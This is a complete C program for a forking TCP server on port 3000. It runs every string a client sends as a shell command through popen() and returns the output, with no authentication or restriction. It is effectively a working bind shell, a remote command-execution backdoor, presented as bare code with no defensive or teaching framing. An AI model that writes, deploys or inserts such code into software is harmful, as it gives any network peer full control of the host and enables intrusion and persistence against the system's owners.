#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 3000
#define BUFFER_SIZE 1024

void handle_client(int client_sock)
{
    char buffer[BUFFER_SIZE];
    int bytes_received;

    while (1)
    {
        // Receive command from client
        bytes_received = recv(client_sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0)
        {
            close(client_sock);
            exit(0); // Client disconnected
        }
        buffer[bytes_received] = '\0'; // Null-terminate the string

        // Execute the command and redirect output to client
        FILE *fp = popen(buffer, "r"); // Open pipe to command output
        if (fp == NULL)
        {
            perror("popen failed");
            continue;
        }

        // Send command output back to client
        while (fgets(buffer, BUFFER_SIZE, fp) != NULL)
        {
            send(client_sock, buffer, strlen(buffer), 0);
        }
        pclose(fp);
    }
}

int main()
{
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    // Create socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0)
    {
        perror("Socket creation failed");
        exit(1);
    }

    // Set up server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; // Bind to any available interface
    server_addr.sin_port = htons(PORT);

    // Bind socket
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Bind failed");
        exit(1);
    }

    // Listen for connections
    if (listen(server_sock, 5) < 0)
    {
        perror("Listen failed");
        exit(1);
    }
    printf("Server listening on port %d...\n", PORT);

    // Accept incoming connections
    while (1)
    {
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len);
        if (client_sock < 0)
        {
            perror("Accept failed");
            continue;
        }
        printf("New connection from %s\n", inet_ntoa(client_addr.sin_addr));

        // Fork to handle multiple clients
        if (fork() == 0)
        {                       // Child process
            close(server_sock); // Child doesn't need the listener
            handle_client(client_sock);
            close(client_sock);
            exit(0);
        }
        close(client_sock); // Parent doesn't need this client socket
    }

    close(server_sock);
    return 0;
}